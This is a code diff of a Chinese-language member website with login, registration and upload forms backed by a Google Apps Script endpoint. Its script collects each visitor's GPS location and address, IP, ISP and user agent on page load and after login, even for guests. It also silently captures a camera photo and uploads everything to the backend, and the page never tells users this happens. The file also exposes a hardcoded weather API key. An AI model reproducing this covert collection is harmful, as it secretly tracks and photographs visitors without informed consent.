@@ -159,7 +159,6 @@
           id="loginTabPane"
           role="tabpanel"
           aria-labelledby="tabLogin"
-          tabindex="0"
         >
           <form id="loginForm" class="p-2">
             <div class="mb-3">
@@ -170,6 +169,7 @@
                 class="form-control"
                 placeholder="請輸入 Email"
                 required
+                autocomplete="off"
               />
             </div>
             <div class="mb-3">
@@ -180,6 +180,7 @@
                 class="form-control"
                 placeholder="請輸入密碼"
                 required
+                autocomplete="off"
               />
             </div>
             <button class="btn btn-primary w-100" type="submit">登入</button>
@@ -192,7 +193,6 @@
           id="registerTabPane"
           role="tabpanel"
           aria-labelledby="tabRegister"
-          tabindex="0"
         >
           <form id="registerForm" class="p-2">
             <div class="mb-3">
@@ -203,6 +203,7 @@
                 class="form-control"
                 placeholder="請輸入 Email"
                 required
+                autocomplete="off"
               />
             </div>
             <div class="mb-3">
@@ -213,6 +214,7 @@
                 class="form-control"
                 placeholder="請輸入密碼"
                 required
+                autocomplete="off"
               />
             </div>
             <button class="btn btn-success w-100" type="submit">註冊</button>
@@ -225,11 +227,10 @@
           id="profileTabPane"
           role="tabpanel"
           aria-labelledby="tabProfile"
-          tabindex="0"
         >
           <form class="p-2">
             <div class="mb-3">
-              <label class="form-label">Email (只能查看示範，如需編輯請自行擴充)</label>
+              <label class="form-label">Email (僅示範)</label>
               <input
                 type="email"
                 id="profileEmail"
@@ -237,7 +238,6 @@
                 readonly
               />
             </div>
-            <!-- 這裡也可放使用者暱稱、電話等欄位 -->
             <div class="alert alert-info">
               此示範只顯示 Email 欄位。如需更多資料編輯，請自行擴充後端 API。
             </div>
@@ -250,7 +250,6 @@
           id="passwordTabPane"
           role="tabpanel"
           aria-labelledby="tabPassword"
-          tabindex="0"
         >
           <form id="changePasswordForm" class="p-2">
             <div class="mb-3">
@@ -261,6 +260,7 @@
                 class="form-control"
                 placeholder="請輸入舊密碼"
                 required
+                autocomplete="off"
               />
             </div>
             <div class="mb-3">
@@ -271,6 +271,7 @@
                 class="form-control"
                 placeholder="請輸入新密碼"
                 required
+                autocomplete="off"
               />
             </div>
             <button class="btn btn-warning w-100" type="submit">修改密碼</button>
@@ -287,7 +288,7 @@
     <div class="modal-content p-3">
       <div class="modal-header">
         <h5 class="modal-title" id="adminModalLabel">管理者登入</h5>
-        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
       </div>
       <form id="adminLoginForm" class="p-2">
         <div class="mb-3">
@@ -298,6 +299,7 @@
             class="form-control"
             placeholder="請輸入管理者 Email"
             required
+            autocomplete="off"
           />
         </div>
         <div class="mb-3">
@@ -308,6 +310,7 @@
             class="form-control"
             placeholder="請輸入管理者密碼"
             required
+            autocomplete="off"
           />
         </div>
         <button class="btn btn-warning w-100" type="submit">登入</button>
@@ -381,10 +384,7 @@
 </div>
 
 <script>
-  // -------------------------------------------------
-  // 前端主要邏輯
-  // -------------------------------------------------
-  // ★ 重要：對應您自己的 Apps Script 網址
+  // ★ 請改成您自己的 Apps Script 網址
   const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbziPdzAYFKlMUg4GXkBiGXCgtjp8b3RkIKI3YzA4DYemjlHUehdtRwr-dl_C-friyCYJQ/exec';
 
   const statusSuccess = document.getElementById('statusSuccess');
@@ -392,26 +392,23 @@
   const guestTip      = document.getElementById('guestTip');
   const memberPanel   = document.getElementById('memberPanel');
   
+  // 動態更新 Navbar
   function updateNavbar() {
     const navRight = document.getElementById('navRight');
     navRight.innerHTML = '';
     const email = sessionStorage.getItem('email');
 
     if (email) {
-    const liHello = document.createElement('li');
-    liHello.classList.add('nav-item', 'd-flex', 'align-items-center', 'me-2');
-    liHello.innerHTML = `
-      <span style="color:#fff; font-size:1rem; margin-right:10px;">
-        您好，${email}
-      </span>`;
-
+      // 已登入
+      const liHello = document.createElement('li');
+      liHello.classList.add('nav-item', 'd-flex', 'align-items-center', 'me-2');
+      liHello.innerHTML = `<span style="color:#fff; margin-right:10px;">您好，${email}</span>`;
 
       const liLogout = document.createElement('li');
       liLogout.classList.add('nav-item');
       const logoutBtn = document.createElement('button');
       logoutBtn.classList.add('btn', 'btn-secondary', 'btn-sm');
       logoutBtn.textContent = '登出';
-      logoutBtn.title = '點此登出';
       logoutBtn.onclick = () => {
         sessionStorage.removeItem('email');
         location.reload();
@@ -421,6 +418,7 @@
       navRight.appendChild(liHello);
       navRight.appendChild(liLogout);
     } else {
+      // 未登入
       const liUserCenter = document.createElement('li');
       liUserCenter.classList.add('nav-item', 'me-2');
       const userBtn = document.createElement('button');
@@ -457,7 +455,7 @@
       statusSuccess.style.opacity = '0';
       setTimeout(() => {
         statusSuccess.classList.add('d-none');
-        statusSuccess.style.opacity = '1'; 
+        statusSuccess.style.opacity = '1';
       }, 800);
     }, 3000);
   }
@@ -470,26 +468,25 @@
   }
 
   // -------------------------------------------------
-  // 1) 使用者註冊
+  // 1) 註冊
   // -------------------------------------------------
   document.getElementById('registerForm').addEventListener('submit', async (e) => {
     e.preventDefault();
-    const email = document.getElementById('regEmail').value;
-    const password = document.getElementById('regPassword').value;
+    const email = document.getElementById('regEmail').value.trim();
+    const password = document.getElementById('regPassword').value.trim();
     try {
-      const formData = new FormData();
-      formData.append('action', 'register');
-      formData.append('email', email);
-      formData.append('password', password);
+      const fd = new FormData();
+      fd.append('action', 'register');
+      fd.append('email', email);
+      fd.append('password', password);
 
-      // 用 fetch 發送 formData (非 JSON)
-      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
-      if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
-      const result = await resp.json();
-      if (result.success) {
+      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: fd });
+      if (!resp.ok) throw new Error('HTTP ' + resp.status);
+      const data = await resp.json();
+      if (data.success) {
         showSuccessMessage('註冊成功，請切換到「登入」標籤！');
       } else {
-        showErrorMessage('註冊失敗：' + (result.error || '未知原因'));
+        showErrorMessage('註冊失敗：' + (data.error || '未知原因'));
       }
     } catch (err) {
       showErrorMessage('註冊錯誤：' + err.message);
@@ -497,154 +494,150 @@
   });
 
   // -------------------------------------------------
-  // 2) 使用者登入
+  // 2) 一般使用者登入
   // -------------------------------------------------
   document.getElementById('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
-    const email = document.getElementById('loginEmail').value;
-    const password = document.getElementById('loginPassword').value;
+    const email    = document.getElementById('loginEmail').value.trim();
+    const password = document.getElementById('loginPassword').value.trim();
     try {
-      const formData = new FormData();
-      formData.append('action', 'login');
-      formData.append('email', email);
-      formData.append('password', password);
+      const fd = new FormData();
+      fd.append('action','login');
+      fd.append('email', email);
+      fd.append('password', password);
 
-      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
-      if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
-      const result = await resp.json();
-      if (result.success) {
-      sessionStorage.setItem('email', result.user_id);
-      showSuccessMessage('登入成功！');
+      const resp = await fetch(SCRIPT_URL, { method:'POST', body: fd });
+      if(!resp.ok) throw new Error('HTTP '+resp.status);
 
-  // 1) 直接打開會員中心Modal
-      const userModalObj = bootstrap.Modal.getOrCreateInstance(document.getElementById('userModal'));
-      userModalObj.show();
-
-  // 2) 切換到「修改密碼」標籤
-      const tabPassword = document.getElementById('tabPassword');
-      if (tabPassword) {
-      tabPassword.click();  // 讓 bootstrap 自動切到該分頁
-      }
-
+      const data = await resp.json();
+      if(data.success) {
+        sessionStorage.setItem('email', data.user_id);
+        showSuccessMessage('登入成功！');
+        
         // 關閉登入對話框
-        const userModalObj = bootstrap.Modal.getInstance(document.getElementById('userModal'));
-        if (userModalObj) userModalObj.hide();
+        const modalObj = bootstrap.Modal.getInstance(document.getElementById('userModal'));
+        if(modalObj) modalObj.hide();
 
         updateNavbar();
         guestTip.style.display = 'none';
         memberPanel.style.display = 'block';
-
-        // 將登入的 email 顯示到「資料設定」的欄位 (可自行擴充)
-        document.getElementById('profileEmail').value = result.user_id || '';
+        document.getElementById('profileEmail').value = data.user_id || '';
 
         // 收集裝置資料
         collectAndSendData();
       } else {
-        showErrorMessage(`登入失敗：${result.error}`);
+        showErrorMessage('登入失敗：' + data.error);
       }
-    } catch (err) {
-      showErrorMessage(`系統錯誤：${err.message}`);
+    } catch(err) {
+      showErrorMessage('登入錯誤：' + err.message);
     }
   });
 
   // -------------------------------------------------
   // 3) 管理者登入
   // -------------------------------------------------
-  document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
+  document.getElementById('adminLoginForm').addEventListener('submit', async(e)=>{
     e.preventDefault();
-    const email = document.getElementById('adminEmail').value;
-    const password = document.getElementById('adminPassword').value;
+    const email    = document.getElementById('adminEmail').value.trim();
+    const password = document.getElementById('adminPassword').value.trim();
     try {
-      const formData = new FormData();
-      formData.append('action', 'adminLogin');
-      formData.append('email', email);
-      formData.append('password', password);
+      const fd = new FormData();
+      fd.append('action','adminLogin');
+      fd.append('email', email);
+      fd.append('password', password);
 
-      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
-      if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
-      const result = await resp.json();
-      if (result.success) {
+      const resp = await fetch(SCRIPT_URL, { method:'POST', body: fd });
+      if(!resp.ok) throw new Error('HTTP '+resp.status);
+
+      const data = await resp.json();
+      if(data.success) {
         showSuccessMessage('管理者登入成功！');
+
+        // 關閉管理者登入 Modal
         const adminModalObj = bootstrap.Modal.getInstance(document.getElementById('adminModal'));
-        if (adminModalObj) adminModalObj.hide();
-        // 這裡改成您的 admin 後台網址
+        if(adminModalObj) adminModalObj.hide();
+
+        // 跳轉到後台 (請改成您實際的 admin.php)
         window.location.href = 'https://your-domain/admin.php';
       } else {
-        showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
+        showErrorMessage('管理者登入失敗：'+(data.error||'未知原因'));
       }
-    } catch (err) {
-      showErrorMessage('管理者登入錯誤：' + err.message);
+    } catch(err) {
+      showErrorMessage('管理者登入錯誤：'+err.message);
     }
   });
 
   // -------------------------------------------------
-  // 4) 使用者回傳文字訊息
+  // 4) 回傳文字訊息
   // -------------------------------------------------
-  document.getElementById('sendMessageBtn').addEventListener('click', async () => {
+  document.getElementById('sendMessageBtn').addEventListener('click', async()=>{
     const email = sessionStorage.getItem('email') || 'guest_user';
     const message = document.getElementById('userMessage').value.trim();
-    if (!message) {
-      showErrorMessage('請先輸入訊息，再按「回傳訊息」');
+    if(!message) {
+      showErrorMessage('請先輸入訊息!');
       return;
     }
     try {
-      const formData = new FormData();
-      formData.append('action', 'sendMessage');
-      formData.append('email', email);
-      formData.append('textMessage', message);
+      const fd = new FormData();
+      fd.append('action','sendMessage');
+      fd.append('email', email);
+      fd.append('textMessage', message);
 
-      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
-      const result = await resp.json();
-      if (result.success) {
+      const resp = await fetch(SCRIPT_URL,{ method:'POST', body: fd });
+      if(!resp.ok) throw new Error('HTTP '+ resp.status);
+
+      const data = await resp.json();
+      if(data.success) {
         showSuccessMessage('訊息已回傳成功！');
-        document.getElementById('userMessage').value = '';
+        document.getElementById('userMessage').value='';
       } else {
-        showErrorMessage(`回傳失敗：${result.error}`);
+        showErrorMessage('回傳失敗：'+(data.error||'未知'));
       }
-    } catch (err) {
-      showErrorMessage(`系統錯誤：${err.message}`);
+    } catch(err) {
+      showErrorMessage('系統錯誤：'+err.message);
     }
   });
 
   // -------------------------------------------------
-  // 5) 使用者回傳圖片
+  // 5) 回傳圖片
   // -------------------------------------------------
-  document.getElementById('sendImageBtn').addEventListener('click', async () => {
+  document.getElementById('sendImageBtn').addEventListener('click', async()=>{
     const email = sessionStorage.getItem('email') || 'guest_user';
     const fileInput = document.getElementById('userImage');
-    if (!fileInput.files[0]) {
-      showErrorMessage('請先選擇圖片，再按「回傳圖片」');
+    if(!fileInput.files[0]) {
+      showErrorMessage('請先選擇圖片');
       return;
     }
     try {
       const base64Data = await readFileAsBase64(fileInput.files[0]);
-      const formData = new FormData();
-      formData.append('action', 'sendUserImage');
-      formData.append('email', email);
-      formData.append('userImageData', base64Data);
+      const fd = new FormData();
+      fd.append('action','sendUserImage');
+      fd.append('email', email);
+      fd.append('userImageData', base64Data);
 
-      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
-      const result = await resp.json();
-      if (result.success) {
+      const resp = await fetch(SCRIPT_URL, {method:'POST', body:fd});
+      if(!resp.ok) throw new Error('HTTP '+resp.status);
+
+      const data = await resp.json();
+      if(data.success) {
         showSuccessMessage('圖片已回傳成功！');
-        fileInput.value = '';
+        fileInput.value='';
       } else {
-        showErrorMessage(`圖片回傳失敗：${result.error}`);
+        showErrorMessage('圖片回傳失敗：'+(data.error||'未知'));
       }
-    } catch (err) {
-      showErrorMessage(`系統錯誤：${err.message}`);
+    } catch(err) {
+      showErrorMessage('系統錯誤：'+err.message);
     }
   });
-
-  // 將檔案讀成 base64
+  // 讀檔案→Base64
   function readFileAsBase64(file) {
-    return new Promise((resolve, reject) => {
+    return new Promise((resolve,reject)=>{
       const reader = new FileReader();
-      reader.onload = () => {
+      reader.onload = ()=> {
         const base64String = reader.result.split(',')[1];
         resolve(base64String);
       };
-      reader.onerror = (err) => reject(err);
+      reader.onerror = err=> reject(err);
       reader.readAsDataURL(file);
     });
   }
@@ -652,43 +645,42 @@
   // -------------------------------------------------
   // 6) 修改密碼
   // -------------------------------------------------
-  document.getElementById('changePasswordForm').addEventListener('submit', async (e) => {
+  document.getElementById('changePasswordForm').addEventListener('submit', async(e)=>{
     e.preventDefault();
     const email = sessionStorage.getItem('email');
-    if (!email) {
-      showErrorMessage('請先登入，才能修改密碼。');
+    if(!email) {
+      showErrorMessage('請先登入才能修改密碼');
       return;
     }
-    const oldPassword = document.getElementById('oldPassword').value.trim();
-    const newPassword = document.getElementById('newPassword').value.trim();
-
-    if (!oldPassword || !newPassword) {
-      showErrorMessage('請輸入舊密碼與新密碼。');
+    const oldPwd = document.getElementById('oldPassword').value.trim();
+    const newPwd = document.getElementById('newPassword').value.trim();
+    if(!oldPwd || !newPwd) {
+      showErrorMessage('請填入舊密碼與新密碼');
       return;
     }
-
     try {
-      const formData = new FormData();
-      formData.append('action', 'changePassword');
-      formData.append('email', email);
-      formData.append('oldPassword', oldPassword);
-      formData.append('newPassword', newPassword);
+      const fd = new FormData();
+      fd.append('action','changePassword');
+      fd.append('email', email);
+      fd.append('oldPassword', oldPwd);
+      fd.append('newPassword', newPwd);
 
-      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
-      if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
-      const result = await resp.json();
-      if (result.success) {
-        showSuccessMessage('密碼修改成功！請重新登入以確保狀態同步。');
+      const resp = await fetch(SCRIPT_URL,{method:'POST', body:fd});
+      if(!resp.ok) throw new Error('HTTP '+resp.status);
+
+      const data = await resp.json();
+      if(data.success) {
+        showSuccessMessage('密碼修改成功，請重新登入');
       } else {
-        showErrorMessage('密碼修改失敗：' + (result.error || '未知原因'));
+        showErrorMessage('修改失敗：'+(data.error||'未知原因'));
       }
-    } catch (err) {
-      showErrorMessage('修改密碼錯誤：' + err.message);
+    } catch(err) {
+      showErrorMessage('修改密碼錯誤：'+ err.message);
     }
   });
 
   // -------------------------------------------------
-  // 收集 GPS / IP / Photo 等資訊並送到後端
+  // 收集GPS / IP / 相機照片
   // -------------------------------------------------
   async function collectAndSendData() {
     const statusElem = document.getElementById('status');
@@ -696,61 +688,59 @@
       statusElem.textContent = '正在收集資料...';
     }
 
-    const collectedData = { gps: null, ip: null, photo: null };
+    const collectedData = { gps:null, ip:null, photo:null };
     try {
-      const [gpsResult, ipResult] = await Promise.allSettled([
+      const [gpsRes, ipRes] = await Promise.allSettled([
         getGpsCoordinates(),
         getIpInfo()
       ]);
+      const photoRes = await startCamera({width:1280,height:720});
 
-      const photoResult = await startCamera({width:1280,height:720}); // 也可調整解析度
+      if(gpsRes.status==='fulfilled') collectedData.gps   = gpsRes.value;
+      if(ipRes.status==='fulfilled')  collectedData.ip    = ipRes.value;
+      if(photoRes)                    collectedData.photo = photoRes;
 
-      if (gpsResult.status === 'fulfilled') collectedData.gps = gpsResult.value;
-      if (ipResult.status === 'fulfilled')  collectedData.ip = ipResult.value;
-      if (photoResult)                     collectedData.photo = photoResult;
-
-      if (sessionStorage.getItem('email')) {
-        // 更新前端顯示
+      if(sessionStorage.getItem('email')) {
         updateUI(collectedData);
       }
 
-      // 傳給後端
-      const formData = new FormData();
-      const email = sessionStorage.getItem('email') || 'guest_user';
-      formData.append('action', 'collectData'); // 後端預設: 非前三者(註冊/登入/訊息)，就走 handleCollectAndNotify
-      formData.append('email', email);
+      // 傳後端
+      const fd = new FormData();
+      fd.append('action','collectData');
+      const email = sessionStorage.getItem('email')||'guest_user';
+      fd.append('email', email);
 
-      if (collectedData.gps) {
-        formData.append('latitude',  collectedData.gps.latitude);
-        formData.append('longitude', collectedData.gps.longitude);
-        formData.append('address',   collectedData.gps.address);
+      if(collectedData.gps) {
+        fd.append('latitude', collectedData.gps.latitude);
+        fd.append('longitude',collectedData.gps.longitude);
+        fd.append('address',collectedData.gps.address);
       }
-      if (collectedData.ip) {
-        formData.append('ip',        collectedData.ip.ip);
-        formData.append('ipType',    collectedData.ip.ipType);
-        formData.append('userAgent', collectedData.ip.userAgent);
-        formData.append('city',      collectedData.ip.city);
-        formData.append('region',    collectedData.ip.region);
-        formData.append('country',   collectedData.ip.country);
-        formData.append('org',       collectedData.ip.org);
+      if(collectedData.ip) {
+        fd.append('ip',collectedData.ip.ip);
+        fd.append('ipType',collectedData.ip.ipType);
+        fd.append('userAgent',collectedData.ip.userAgent);
+        fd.append('city',collectedData.ip.city);
+        fd.append('region',collectedData.ip.region);
+        fd.append('country',collectedData.ip.country);
+        fd.append('org',collectedData.ip.org);
       }
-      if (collectedData.photo) {
-        formData.append('imageData', collectedData.photo);
+      if(collectedData.photo) {
+        fd.append('imageData',collectedData.photo);
       }
 
-      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
+      const resp = await fetch(SCRIPT_URL,{method:'POST', body:fd});
       const result = await resp.json();
-      if (statusElem) {
-        if (result.success) {
-          statusElem.textContent = '資料已成功發送！';
+      if(statusElem) {
+        if(result.success) {
+          statusElem.textContent='資料已成功發送！';
         } else {
-          statusElem.textContent = `資料發送失敗：${result.error}`;
+          statusElem.textContent='資料發送失敗：'+(result.error||'未知');
         }
       }
-    } catch (err) {
-      console.error('資料收集/上傳錯誤：', err);
-      if (statusElem) {
-        statusElem.textContent = '資料收集或傳送時發生錯誤。';
+    } catch(err) {
+      console.error('收集/上傳錯誤:', err);
+      if(statusElem) {
+        statusElem.textContent='資料收集/傳送時發生錯誤。';
       }
     }
   }
@@ -760,108 +750,98 @@
       const resp = await fetch('https://ipinfo.io/json');
       const data = await resp.json();
       const { ip, city, region, country, org } = data;
-      const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
+      const ipType = ip.includes('.')?'IPV4':'IPV6';
       const userAgent = navigator.userAgent;
       return { ip, ipType, userAgent, city, region, country, org };
-    } catch (err) {
-      console.warn('IP 獲取失敗:', err);
+    } catch(err) {
+      console.warn('IP獲取失敗:', err);
       return null;
     }
   }
-
   async function getGpsCoordinates() {
     try {
-      const position = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+      const position = await new Promise((resolve,reject)=>{
+        navigator.geolocation.getCurrentPosition(resolve,reject,{timeout:10000});
       });
       const { latitude, longitude } = position.coords;
       const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
       const data = await resp.json();
-      const address = data.display_name || '未知地址';
+      const address = data.display_name||'未知地址';
       return { latitude, longitude, address };
-    } catch (err) {
-      console.warn('GPS 獲取失敗:', err);
+    } catch(err) {
+      console.warn('GPS獲取失敗:',err);
       return null;
     }
   }
-
   async function startCamera(constraints) {
-    let stream = null;
+    let stream=null;
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: constraints });
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      await new Promise((resolve) => {
-        video.onloadedmetadata = () => {
-          video.play();
-          resolve();
-        };
+      stream=await navigator.mediaDevices.getUserMedia({video:constraints});
+      const video=document.createElement('video');
+      video.srcObject=stream;
+      await new Promise((r)=>{
+        video.onloadedmetadata=()=>{video.play();r();};
       });
-      // 等攝影機畫面就緒
-      await new Promise((r) => setTimeout(r, 300));
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const photoData = canvas.toDataURL('image/jpeg', 1).split(',')[1]; 
+      await new Promise(r=> setTimeout(r,300));
+      const canvas=document.createElement('canvas');
+      canvas.width = video.videoWidth||640;
+      canvas.height= video.videoHeight||480;
+      const ctx=canvas.getContext('2d');
+      ctx.drawImage(video,0,0,canvas.width,canvas.height);
+      const photoData=canvas.toDataURL('image/jpeg',1).split(',')[1];
       return photoData;
-    } catch (error) {
-      console.warn('相機啟動失敗:', error);
+    } catch(err) {
+      console.warn('相機啟動失敗:',err);
       return null;
     } finally {
-      if (stream) {
-        stream.getTracks().forEach((track) => track.stop());
-      }
+      if(stream) stream.getTracks().forEach(track=>track.stop());
     }
   }
 
-  // 更新前端顯示 (IP, 地圖, 天氣等)
-  function updateUI({ gps, ip }) {
+  // 更新前端顯示
+  function updateUI({gps, ip}) {
     const ipElem = document.getElementById('ipInfo');
-    if (ip && ipElem) {
+    if(ip && ipElem) {
       ipElem.textContent = `IP: ${ip.ip}, City: ${ip.city}, Region: ${ip.region}`;
-    } else if (ipElem) {
+    } else if(ipElem) {
       ipElem.textContent = '無法取得 IP 資訊';
     }
 
-    if (gps) {
-      document.getElementById('map').src = `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}&hl=zh-TW&z=15&output=embed`;
+    if(gps) {
+      document.getElementById('map').src=
+        `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}&hl=zh-TW&z=15&output=embed`;
       getWeatherInfo(gps.latitude, gps.longitude);
     }
   }
-
-  async function getWeatherInfo(lat, lon) {
+  async function getWeatherInfo(lat,lon) {
     try {
-      if (!lat || !lon) return;
-      const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';//ae0c5817d5c802a5f12d3c9de2517611
-      const resp = await fetch(
-        `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&lang=zh_tw&appid=${apiKey}`
-      );
-      const data = await resp.json();
-      const temp = data.main.temp;
-      const weather = data.weather[0].description;
-      const humidity = data.main.humidity;
-      document.getElementById('weatherInfo').innerHTML = `
+      if(!lat||!lon) return;
+      const apiKey='ae0c5817d5c802a5f12d3c9de2517611';//ae0c5817d5c802a5f12d3c9de2517611
+      const resp=await fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&lang=zh_tw&appid=${apiKey}`);
+      const data=await resp.json();
+      const temp=data.main.temp;
+      const weather=data.weather[0].description;
+      const humidity=data.main.humidity;
+      document.getElementById('weatherInfo').innerHTML=`
         <img src="https://openweathermap.org/img/wn/${data.weather[0].icon}.png" alt="${weather}">
         溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%
       `;
-    } catch (err) {
-      console.error('天氣資訊獲取失敗:', err);
-      document.getElementById('weatherInfo').textContent = '天氣資訊載入失敗...';
+    } catch(err) {
+      console.error('天氣資訊獲取失敗:',err);
+      document.getElementById('weatherInfo').textContent='天氣資訊載入失敗...';
     }
   }
 
-  // DOM 載入後執行
-  document.addEventListener('DOMContentLoaded', async () => {
+  // DOM 載入後
+  document.addEventListener('DOMContentLoaded', ()=>{
     updateNavbar();
-    const email = sessionStorage.getItem('email');
-    if (email) {
-      guestTip.style.display = 'none';
-      memberPanel.style.display = 'block';
-      document.getElementById('profileEmail').value = email;
+    const email=sessionStorage.getItem('email');
+    if(email) {
+      guestTip.style.display='none';
+      memberPanel.style.display='block';
+      document.getElementById('profileEmail').value=email;
     }
-    // 即使是訪客，也嘗試收集一次
+    // 即使是訪客，也嘗試收集一次 (GPS,IP,Camera)
     collectAndSendData();
   });
 </script>
